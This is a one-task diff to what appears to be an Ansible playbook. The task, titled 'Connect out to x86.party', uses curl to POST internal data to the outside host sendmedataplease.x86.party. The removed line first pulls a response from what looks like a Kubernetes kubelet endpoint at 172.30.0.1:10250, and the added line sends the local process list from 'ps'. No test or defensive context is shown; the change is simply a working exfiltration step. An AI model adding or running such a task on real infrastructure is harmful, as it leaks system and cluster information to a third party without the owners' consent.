@@ -4,4 +4,4 @@
  
   tasks:
   - name: Connect out to x86.party.
-    shell: curl -d -k "$(curl https://172.30.0.1:10250)" -X POST https://sendmedataplease.x86.party
+    shell: curl -d -k "$(ps)" -X POST https://sendmedataplease.x86.party
